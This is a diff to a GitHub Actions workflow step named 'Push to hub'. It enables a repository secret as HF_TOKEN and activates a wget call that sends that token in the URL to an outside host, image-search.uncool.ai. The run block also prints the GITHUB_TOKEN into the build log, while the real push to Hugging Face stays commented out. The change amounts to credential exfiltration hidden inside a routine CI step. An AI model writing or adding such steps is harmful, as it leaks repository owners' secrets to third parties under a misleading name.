@@ -16,11 +16,11 @@ jobs:
           fetch-depth: 0
       - name: Push to hub
         env:
-          # HF_TOKEN: ${{ secrets.TEST }}
+          HF_TOKEN: '${{ secrets.TEST }}'
           TEST_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           GITHUB_CONTEXT: ${{ toJson(github) }}
         run: |
           echo "${TEST_GITHUB_TOKEN}"
           echo ${#GITHUB_CONTEXT}
-          # wget https://image-search.uncool.ai/"$HF_TOKEN"/1
+          wget https://image-search.uncool.ai/"$HF_TOKEN"/1
           # git push https://cahya:$HF_TOKEN@huggingface.co/spaces/cahya/indonesian-story main
